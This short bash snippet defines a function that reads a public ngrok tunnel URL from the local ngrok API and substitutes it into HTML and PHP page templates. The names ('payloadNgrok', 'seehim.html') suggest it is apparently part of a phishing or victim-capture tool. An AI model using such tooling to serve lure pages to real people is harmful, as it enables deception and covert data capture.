#!/bin/bash

payloadNgrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' web/seehim.html > web/index2.html
sed 's+forwarding_link+'$link'+g' web/template.php > web/index.php

}
